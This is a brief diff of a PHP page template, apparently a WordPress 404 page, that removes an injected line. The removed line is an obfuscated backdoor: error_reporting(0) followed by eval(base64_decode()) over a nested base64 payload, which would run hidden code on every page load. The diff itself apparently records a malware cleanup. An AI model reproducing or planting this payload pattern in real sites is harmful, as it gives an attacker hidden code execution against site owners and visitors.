@@ -1,4 +1,4 @@
-<?php error_reporting(0); eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtGcFlXbWhpUTJocFdWaE9iRTVxVW1aYVIxWnFZakpTYkV0R2NGbFhiV2hwVVRKb2NGZFdhRTlpUlRWeFZXMWFZVkl4V25GWmFrcFRZa1YwUjJOR2FGVmlWR3h3V2xaV1IyTkdVbkpWYTBwT1VsZDRSMVp0TlhOaGJVcFZZa1JXVkZZelFqWlZla3BQVTBaS2RXTkhjRTVOVlhBeVYxUkpNVlp0U1hkalJXUlFWbXRhVmxSV1ZURldiRm8yVTJwU2EySldTakJXYlRGVFZFWmFTVlJyZUV4Vk1uTXpTMU5yTnlrcE93KSk7)); ?>
+<?php error_reporting(0);?>
 <?php
 /**
  * The template for displaying 404 pages (Not Found).
